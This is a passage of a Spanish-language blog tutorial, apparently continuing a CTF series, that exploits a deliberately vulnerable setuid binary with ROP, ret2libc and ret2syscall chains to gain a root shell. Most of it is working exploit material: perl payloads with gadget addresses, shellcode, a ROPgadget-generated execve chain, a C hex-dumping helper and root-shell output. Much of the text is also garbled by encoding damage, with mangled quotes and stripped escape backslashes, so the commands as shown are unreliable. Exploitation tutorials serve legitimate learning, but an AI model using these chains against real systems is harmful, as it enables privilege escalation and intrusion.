1ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÐ»ï¿½ï¿½ï¿½lï¿½ï¿½ï¿½lï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½0lï¿½ï¿½  
) = 165  
```  
Vemos que strcpy escribe en 0xffffd200, por lo que esa es la dir de buf. Teniendo en cuenta que desde buf hasta EIP(s) van 140 bytes, y que luego escribimos 6 direcciones (32 bits cada una, 4 bytes), hacen

140 + 24 = \[espera que... gnome-calculator\]164

0xffffd200+0xa4 = 0xffffd2a4

Por cierto, el hecho de que ltrace no haya acabado es porque se ha quedado esperando el read(). Podemos comprobar que todo ha funcionado perfectamente con strace:  
```$ strace /home/arget/vuln "`cat sc.o``perl -e 'print "A"x(140-33) . "xd0xbbxfdxf7" . "xb5x6cxfdxf7" . "xb6x6cxfdxf7" . "x03x1exe0xf7" . "xaaxaaxffxff" . "x30x6cxfdxf7"'`"  
execve("/home/arget/vuln", ["/home/arget/vuln", "130026032513333152001300Ph//shh/bin211343PS211341260v1322315"...], 0x7fffffffe228 /* 39 vars */) = 0  
strace: [ Process PID=17487 runs in 32 bit mode. ]  
[...]  
read(0,```  
Perfecto. Ajustemos ahora las direcciones

Parte 1 (argumento):
0xf7fdbbd0 xor eax, eax ; ret
0xf7fd6cb5 inc eax ; add al, 1 ; ret
0xf7fd6cb6 add al, 1
0xf7e01e03 pop ecx ; ret
0xffffd2a4                   -> ya sabemos dÃ³nde quedar
0xf7fd6c30 int 0x80 ; ret

Parte 2 (stdin) \[colocada en 0xffffd2a4\]:  
0xf7eb9240  
0xf7e05fdb  
0xffffd000  
0x00010000  
0x00000007  
0xf7de9be7  
0xffffd200  
0xf7dde182 call eax

Bien, ya estamos listos para explotar  
```Primera parte:  
"`cat sc.o``perl -e 'print "A"x(140-33) . "xd0xbbxfdxf7" . "xb5x6cxfdxf7" . "xb6x6cxfdxf7" . "x03x1exe0xf7" . "xa4xd2xffxff" . "x30x6cxfdxf7"'`"```

Segunda parte:  
perl -e â€˜print Â«x40x92xebxf7Â» . Â«xdbx5fxe0xf7Â» . Â«x00xd0xffxffÂ» . Â«x00x00x01x00Â» . Â«x07x00x00x00Â» . Â«xe7x9bxdexf7Â» . Â«x00xd2xffxffÂ» . Â«x82xe1xddxf7â€³â€˜

ExplotaciÃ³n:  
`$ perl -e 'print "x40x92xebxf7" . "xdbx5fxe0xf7" . "x00xd0xffxff" . "x00x00x01x00" . "x07x00x00x00" . "xe7x9bxdexf7" . "x00xd2xffxff" . "x82xe1xddxf7"' > a.txt`

$ (cat a.txt ; cat) | /home/arget/vuln Â«\`cat sc.oÂ«perl -e â€˜print Â«AÂ»x(140-33) . Â«xd0xbbxfdxf7Â» . Â«xb5x6cxfdxf7Â» . Â«xb6x6cxfdxf7Â» . Â«x03x1exe0xf7Â» . Â«xa4xd2xffxffÂ» . Â«x30x6cxfdxf7â€³â€˜\`Â»  
1ï¿½ï¿½ï¿½1ï¿½Í€1ï¿½Ph//shh/binï¿½ï¿½PSï¿½ï¿½ï¿½  
1ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÐ»ï¿½ï¿½ï¿½lï¿½ï¿½ï¿½lï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½0lï¿½ï¿½  
whoami  
arget

\### Oops ###

$ sudo chown root:root vuln

$ sudo chmod u+s vuln

$ (cat a.txt ; cat) | /home/arget/vuln Â«\`cat sc.oÂ«perl -e â€˜print Â«AÂ»x(140-33) . Â«xd0xbbxfdxf7Â» . Â«xb5x6cxfdxf7Â» . Â«xb6x6cxfdxf7Â» . Â«x03x1exe0xf7Â» . Â«xa4xd2xffxffÂ» . Â«x30x6cxfdxf7â€³â€˜\`Â»  
1ï¿½ï¿½ï¿½1ï¿½Í€1ï¿½Ph//shh/binï¿½ï¿½PSï¿½ï¿½ï¿½  
1ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÐ»ï¿½ï¿½ï¿½lï¿½ï¿½ï¿½lï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½0lï¿½ï¿½  
whoami  
root  
QuÃ© hermosura.  
Si no aparece el prompt de la shell es porque escribimos y leemos a travÃ©s de `cat`.  
Por cierto, esto podrÃ­a valer como soluciÃ³n para el ctf del [post anterior](/?p=621). Si bien esto no es propiamente un ret2libc puro, ya que empleamos un shellcode (se trata de un ROP+shellcode), por eso mi soluciÃ³n abajo es tambiÃ©n interesante.

La obtenciÃ³n de gadgets no siempre es completa mediante una Ãºnica herramienta, suele ser recomendable buscar gadgets mediante varias herramientas, siendo mis preferidas `**ROPgadget**`, `Ropper`, `Radare`, `msfelfscan` (`msfpescan`). Adicionalmente, en Windows, puede servir `OllyDbg`.  
Soy consciente de que absolutamente todos los gadgets que he empleado pertenecen a librerÃ­as, lo que es poco recomendable, ya que lo hace poco portable, y en caso de que estÃ© activado el ASLR no funcionarÃ­a, mientras que con el uso de gadgets del binario funcionarÃ­a incluso con ASLR, si bien solo si el binario es no-pie. Pero este era solo un ejemplo para demostrar la tÃ©cnica ROP+shellcode, ademÃ¡s este binario es demasiado pequeÃ±o como para poder encontrar todos los gadgets que pueden llegar a ser necesarios.

**\[1\] Ahora que nos hemos estado peleando todo este tiempo con los bytes nulos, os contarÃ© un secreto: para situar en el stack un byte nulo (ya sea para que sea un argumento de una funciÃ³n o para recogerlo con un pop;ret en un registro con el objetivo de hacer un ret2syscall) se pueden emplear funciones como str(n)cpy â€”byte a byteâ€”, memcpy(), sprintf()â€¦**

No lo he mencionado hasta ahora para desarrollar bien otras tÃ©cnicas. Al final todo se reduce a tener recursos.  
Vamos a ver la soluciÃ³n del reto de ayer de la forma fÃ¡cil  
Sabiendo que

0x0804843c 0x00
08048370 <strcpy@plt>:

$1 = {<text variable, no debug info>} 0xf7e84d60 <setuid>  
$2 = {<text variable, no debug info>} 0xf7e01f80 <system>  
$3 = {<text variable, no debug info>} 0xf7df4f10 <exit>

0xf7f420a8 : /bin/sh

8048590: 5b pop ebx  
8048591: 5e pop esi  
8048592: 5f pop edi  
8048593: 5d pop ebp  
8048594: c3 ret

Construimos un esquema como este  
``/home/arget/vuln "`perl -e 'print "A"x140 . "x70x83x04x08" . "x92x85x04x08" . "xaaxaaxffxff" . "x3cx84x04x08" . "x70x83x04x08" . "x92x85x04x08" . "xaaxaaxffxff" . "x3cx84x04x08" . "x70x83x04x08" . "x92x85x04x08" . "xaaxaaxffxff" . "x3cx84x04x08" . "x70x83x04x08" . "x92x85x04x08" . "xaaxaaxffxff" . "x3cx84x04x08" . "x60x4dxe8xf7" . "x93x85x04x08" . "xefxbexadxde" . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "xa8x20xf4xf7"'`"``

Mediante ltrace vemos el comienzo de buffer, al que le sumamos 140+18\*4 y obtenemos la direcciÃ³n donde se encontrarÃ¡ el 0xdeadbeef que hemos colocado, el argumento de setuid(), de forma que ajustamos las direcciones en las que escribe strcpy().  
Finalmente explotamos  
``$ /home/arget/vuln "`perl -e 'print "A"x140 . "x70x83x04x08" . "x92x85x04x08" . "x94xd2xffxff" . "x3cx84x04x08" . "x70x83x04x08" . "x92x85x04x08" . "x95xd2xffxff" . "x3cx84x04x08" . "x70x83x04x08" . "x92x85x04x08" . "x96xd2xffxff" . "x3cx84x04x08" . "x70x83x04x08" . "x92x85x04x08" . "x97xd2xffxff" . "x3cx84x04x08" . "x60x4dxe8xf7" . "x93x85x04x08" . "xefxbexadxde" . "x80x1fxe0xf7" . "x10x4fxdfxf7" . "xa8x20xf4xf7"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp???????<?p???????<?p???????<?p???????<?`M????ï¾­? ?? O??? ?  
sh-4.4# whoami  
root  
sh-4.4#``

Gran parte de mi objetivo de hoy es demostrar cÃ³mo existen muchas posibles soluciones para cualquier problema, y aunque no siempre _todos los caminos lleven a Roma_, varios sÃ­ lo harÃ¡n, y habrÃ¡ que elegir con cuÃ¡l se siente uno mÃ¡s cÃ³modo. Adicionalmente estas tÃ©cnicas no son lo Ãºnico que se puede emplear, y, en ocasiones no hay nada que hacer con ellas, para evitar entrar en pÃ¡nico es necesario que el exploiter tenga recursos y la mente completamente abierta, acompaÃ±ada de una creatividad esplÃ©ndida y bien entrenada. De ahÃ­ viene el nombre de este post, lo que sepas sobre exploiting no te servirÃ¡ de nada sin la debida creatividad, ademÃ¡s es importante complementar la experiencia adquirida mediante experiencias ajenas, al fin y al cabo el alma del hacking es compartir conocimiento, por eso es importante dedicarse a leer con cuidado soluciones ajenas a retos del dÃ­a a dÃ­a. Recuerdo un post de blackngel (su blog _[blackbycode.com](https://web.archive.org/web/20170920042316/http://blackbycode.com/)_ ha sido borrado, asÃ­ que no puedo traer la referencia, bueno, quizÃ¡ se encuentre en archive.org ðŸ™‚ ), que para situar en el registro eax un valor determinado, empleÃ³ una llamada a read() (que devuelve el nÃºmero de bytes leÃ­dos), para asÃ­, introduciendo la cantidad de bytes justa lograr que read() devolviera en eax el valor deseado.

NosÂ  leemos.

Ya hemos visto antes otra posible soluciÃ³n, pero querÃ­a solucionarlo sin emplear el strcpy() para situar en nuestra cadena de ropeo los bytes nulos.  
Pobre programita, lo hemos explotado ya por todas partes, deberÃ­amos cambiarloâ€¦  
Comencemos con mi primera fase durante este reto. Puse de lÃ­mites que debÃ­a de ser ret2libc puro (no shellcode), y, como ya he dicho, sin emplear el strcpy().  
La primera idea que tuve fue emplear un 0x00000000 ya situado en el stack para que sea el argumento de setuid(), llegando hasta Ã©l mediante varios punteros a instrucciÃ³n `ret`, es decir (comenzando en el EIP(s))

&ret | &ret | &ret | &ret | &ret | &setuid | ret de setuid | 0x00000000

Posteriormente, emplear un gadget `sub esp, 0x??` para continuar con la segunda parte del ROP en la parte del stack anterior al EIP(s).  
Tras no encontrar ningÃºn `sub esp, 0x??` Ãºtil, y de desechar un par de teorÃ­as busco otro lugar donde puede encontrarse el payload: los argumentos del programa, o las variables de entorno. El objetivo serÃ­a en lugar de emplear un `sub esp, 0x??`, emplear un `add esp, 0x????`, algo asÃ­ como un _esp lifting_. El problema es que se trata de un salto grande â€”creo que de casi unos 600 bytesâ€”, y no hubo forma.  
Tras desechar otra gran teorÃ­a recurro al ret2syscall. ROPgadget me da hecho un ropchain para ejecutar un execve() â€”el cual ya veremosâ€”. Pero necesitamos un setuid(0).

La syscall setuid(0) se harÃ­a con EAX = 213 y EBX = 0x00000000. El valor de eax en el momento en que tomamos las riendas del ejecutable depende de la cantidad de bytes que introducimos. Lo mejor serÃ¡ hacerlo cero nada mÃ¡s comenzar, ya veremos cÃ³mo llegar a 213.  
En fin, encontramos un `xor eax, eax;ret` en 0xf7df321f.  
Ahora a ver cÃ³mo llegamos a 213. Â¿Scared?  
Veo que existe un `add ecx, ecx ; ret`, y un `or al, ch ; ret`. El ecx lo tenemos con valor 0xffffffff (-1 o 4294967295, dependiendo de cÃ³mo lo mires) eso tiene fÃ¡cil soluciÃ³n, ya que un `inc ecx` lo overflowearÃ¡ pasando a ser 0x00000000. Bien, si asignamos al comienzo un valor a ecx y lo vamos multiplicando por dos y sumÃ¡ndolo en uno cuando se requiere llegamos al 213 de dos patadas.  

    inc ecx -> ECX = 0x00000000
    inc ecx -> ECX = 0x00000001
    inc ecx -> ECX = 0x00000002
    inc ecx -> ECX = 0x00000003

add ecx, ecx -> ECX = 0x6  
add ecx, ecx -> ECX = 0xc  
inc ecx -> ECX = 0xd  
add ecx, ecx -> ECX = 0x1a  
add ecx, ecx -> ECX = 0x34  
inc ecx -> ECX = 0x35  
add ecx, ecx -> ECX = 0x6a  
add ecx, ecx -> ECX = 0xd4  
inc ecx -> ECX = 0xd5

Bien, ahora podemos pasarlo a eax mediante el `or al, ch`â€¦ oh **_baia_**. Resulta que el 213 (0xd5) se encuentra en cl, no en châ€¦ Pues habrÃ¡ que pasarlo mediante rotaciÃ³n. Resulta que en decimal mover hacia la izquierda las unidades aÃ±adiendo 0â€™s a la derecha es multiplicar por potencias de 10, pues en el sistema binario es multiplicar por potencias de 2, luego multiplicar por potencias de 2 es rotar los bits a la izquierda aÃ±adiendo 0â€™s a la derecha. Tenemos que rotarlo 8 bits (lo movemos de los 8 bits mÃ¡s bajos a los 8 bits mÃ¡s altos del cx), por lo que debemos multiplicar por 28.  

    add ecx, ecx
    add ecx, ecx
    add ecx, ecx
    add ecx, ecx
    add ecx, ecx
    add ecx, ecx
    add ecx, ecx
    add ecx, ecx

Ahora hacemos 0x00000000 el eax (no lo he hecho antes pero no afectaâ€¦)  
`xor eax, eax`  
Ahora el famoso  
`or al, ch`  
Por fortuna en el ebx ya tenemos un 0x0, asÃ­ que solo falta encontrar un `int 0x80;ret` (si solo invocÃ¡semos una syscall bastarÃ­a un `int 0x80`, sin embargo, tras la sycall debemos encadenar mÃ¡s ROP). Cuando ROPgadget en /usr/lib32/libc.so.6 no encuentra ninguno casi me atraganto. Buscamos entonces en ld-linux.so.2, donde se encuentran de hecho dos resultados.  
`int 0x80`  
Algo asÃ­  
`0x080486ee x4`

0x080484aa x2  
0x080486ee  
0x080484aa x2  
0x080486ee  
0x080484aa x2  
0x080486ee

0x080484aa x8

0xf7df321f

0x08048337

0xf7fd6c30  
Hacemos la prueba y mediante strace vemos el setuid32(0). Perfecto.  
Ahora con `python2.7 ROPgadget/ROPgadget.py --binary vuln --badbytes 00 --ropchain` intentamos generar un ropchain para execve(), sin embargo, no es capaz. Vamos a probar para alguna librerÃ­a:  
`python2.7 ROPgadget/ROPgadget.py --binary /usr/lib32/libc.so.6 --badbytes 00 --ropchain --offset 0xf7dc4000`  
Genera el siguiente cÃ³digo  
`#!/usr/bin/env python2  
# execve generated by ROPgadget`

from struct import pack

\# Padding goes here  
p = Â»

p += pack(â€˜<Iâ€™, 0xf7ddf52c) # pop esi ; ret  
p += pack(â€˜<Iâ€™, 0xf7f9b004) # @ .data  
p += pack(â€˜<Iâ€™, 0xf7dc5aae) # pop edx ; ret  
p += â€˜/binâ€™  
p += pack(â€˜<Iâ€™, 0xf7e4a686) # mov dword ptr \[esi\], edx ; pop ebx ; pop esi ; ret  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0xf7ddf52c) # pop esi ; ret  
p += pack(â€˜<Iâ€™, 0xf7f9b008) # @ .data + 4  
p += pack(â€˜<Iâ€™, 0xf7dc5aae) # pop edx ; ret  
p += â€˜//shâ€™  
p += pack(â€˜<Iâ€™, 0xf7e4a686) # mov dword ptr \[esi\], edx ; pop ebx ; pop esi ; ret  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0xf7ddf52c) # pop esi ; ret  
p += pack(â€˜<Iâ€™, 0xf7f9b00c) # @ .data + 8  
p += pack(â€˜<Iâ€™, 0xf7df804e) # xor edx, edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0xf7e4a686) # mov dword ptr \[esi\], edx ; pop ebx ; pop esi ; ret  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0x41414141) # padding  
p += pack(â€˜<Iâ€™, 0xf7dddeb5) # pop ebx ; ret  
p += pack(â€˜<Iâ€™, 0xf7f9b004) # @ .data  
p += pack(â€˜<Iâ€™, 0xf7e01e03) # pop ecx ; ret  
p += pack(â€˜<Iâ€™, 0xf7f9b00c) # @ .data + 8  
p += pack(â€˜<Iâ€™, 0xf7dc5aae) # pop edx ; ret  
p += pack(â€˜<Iâ€™, 0xf7f9b00c) # @ .data + 8  
p += pack(â€˜<Iâ€™, 0xf7df321f) # xor eax, eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dcf5ec) # inc eax ; ret  
p += pack(â€˜<Iâ€™, 0xf7dc6d37) # int 0x80  
AÃ±ado al final un `print p` y redirecciono la salida a `a.txt`.  
Me escribo un programita en C  

    #include <stdio.h>
    #include <ctype.h>
    #include <stdlib.h>

void panic(char\* s)  
{  
perror(s);  
exit(-1);  
}

int main(int argc, char\*\* argv)  
{  
unsigned char c;  
FILE\* f;

if(argc < 2) return 1;

f = fopen(argv\[1\], Â«rbÂ»);  
if(!f) panic(Â«Error en fopen()Â»);  
while(1)  
{  
c = fgetc(f);  
if(feof(f)) break;  
if(isalnum(c)) putchar(c); // Esto luego resultÃ³ mala idea  
else  
printf(Â«\\x%02xÂ», c);  
}  
putchar(â€˜nâ€™);  
return 0;  
}

Lo ejecuto sobre `a.txt` y obtengo los valores hexadecimales del payload de forma apropiada para inyectarse de igual manera que como venimos haciendo. Ya en un futuro haremos exploits en python, cuando la complejidad lo requiera.  
En el ROP generado cambiamos las direcciones de .data y .data+xx, ya que eso estÃ¡ pensado para el .data de libc.so.6, asÃ­ que las cambiamos por las del .data del binario: 0x0804a018 y sucesivas.

Tenemos otro problemita, y es que ROPgadget ha cometido un error al crear ese ROP, ya que en el segundo `pop esi` recoge .data+8, y luego ejecuta el gadget `xor edx, edx ; pop...;ret`. El problema es que ese Ãºltimo gadget contiene un `pop esi` que recoge un 0x41414141 colocado ahÃ­ para relleno (los popâ€™s entre el `xor edx,edx` y el ret tienen que recoger algo inocuo, si no se cargarÃ¡n la cadena de ropeo, por eso es necesario colocar relleno), luego, el esi se dereferencia hacia -supuestamente- .data+8 en el gadget `mov [esi], edx`, lo que (al contener el esi realmente un 0x41414141) supone una violaciÃ³n de segmento. Se puede arreglar situando en el segundo 0x41414141 tras el gadget `xor edx,edx` la direcciÃ³n de .data+8 .

Al fin estamos listos para explotarlo de verdad:  
``$ /home/arget/vuln "`perl -e 'print "A"x140 . "xeex86x04x08"x4 . ("xaax84x04x08"x2 . "xeex86x04x08")x3 . "xaax84x04x08"x8 . "x1fx32xdfxf7" . "x37x83x04x08" . "x30x6cxfdxf7" . "x2cxf5xddxf7" . "x18xa0x04x08" . "xaeZxdcxf7" . "/bin" . "x86xa6xe4xf7" . "AAAA" . "AAAA" . "x2cxf5xddxf7" . "x1cxa0x04x08" . "xaeZxdcxf7" . "//sh" . "x86xa6xe4xf7" . "AAAA" . "AAAA" . "x2cxf5xddxf7" . "x20xa0x04x08" . "Nx80xdfxf7" . "AAAA" . "x20xa0x04x08" . "AAAA" . "AAAA" . "x86xa6xe4xf7" . "AAAA" . "AAAA" . "xb5xdexddxf7" . "x18xa0x04x08" . "x03x1exe0xf7" . "x20xa0x04x08" . "xaeZxdcxf7" . "x20xa0x04x08" . "x1f2xdfxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "xecxf5xdcxf7" . "7mxdcxf7"'`"  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ 2ï¿½ï¿½7ï¿½0lï¿½ï¿½,ï¿½ï¿½ï¿½ ï¿½ï¿½Zï¿½ï¿½/binï¿½ï¿½ï¿½ï¿½AAAAAAAA,ï¿½ï¿½ï¿½ ï¿½ï¿½Zï¿½ï¿½//shï¿½ï¿½ï¿½ï¿½AAAAAAAA,ï¿½ï¿½ï¿½ ï¿½Nï¿½ï¿½ï¿½AAAA ï¿½AAAAAAAAï¿½ï¿½ï¿½ï¿½AAAAAAAAï¿½ï¿½ï¿½ï¿½ ï¿½ ï¿½ï¿½ ï¿½ï¿½Zï¿½ï¿½ ï¿½ 2ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½7mï¿½ï¿½  
[root@plata arget]# whoami  
root  
[root@plata arget]#``

Buenas noches.